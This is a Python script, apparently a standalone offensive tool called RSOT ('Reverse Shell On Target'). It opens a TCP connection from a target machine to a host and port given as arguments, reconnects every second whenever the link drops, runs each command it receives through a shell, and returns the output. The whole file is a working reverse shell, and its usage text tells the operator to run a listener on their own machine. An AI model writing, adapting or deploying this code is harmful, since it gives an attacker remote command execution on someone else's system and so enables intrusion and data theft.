# Imports
import socket
import subprocess
import sys
import time

def show_banner():
    banner = """
 ######   #####  ####### ####### 
 #     # #     # #     #    #    
 #     # #       #     #    #    
 ######   #####  #     #    #    
 #   #         # #     #    #    
 #    #  #     # #     #    #    
 #     #  #####  #######    # 
 
 Reverse Shell On Target
                      by m1ch3al\n\n
    """
    print(banner)



def launch_command(command):
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    return output + output_error


def main():
    show_banner()
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <target_host> <target_port>")
        print("\n remember to bind a tcp/ip server on you machine at the same port")
        sys.exit(1)
    target_host = sys.argv[1]
    try:
        target_port = int(sys.argv[2])
    except ValueError:
        print("Error: The port must be an integer (and remember to bind a tcp/ip server on you machine at the same port)")
        sys.exit(1)

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connected = False
    print("RSOT is trying to connect to {}:{}".format(target_host, target_port))
    while True:
        if not connected:
            try:
                client_socket.connect((target_host, target_port))
                print("RSOT is now connected - ready to receive commands")
                connected = True
            except Exception as ex:
                error_msg = str(ex)
                if "Errno 106" in error_msg or "Errno 9" in error_msg:
                    client_socket.close()
                    client_socket = None
                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print(ex)
                time.sleep(1)
        else:
            try:
                raw_data_from_network = client_socket.recv(1024)
                data = raw_data_from_network.decode("utf-8")
                if len(data) == 0:
                    connected = False
                else:
                    result = launch_command(data)
                    client_socket.send(result)
                    client_socket.send("\n Next command: ".encode())
            except Exception as ex:
                print("RSOT is trying to connect to {}:{}".format(target_host, target_port))
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connected = False
                pass
            time.sleep(1)


if __name__ == "__main__":
    main()
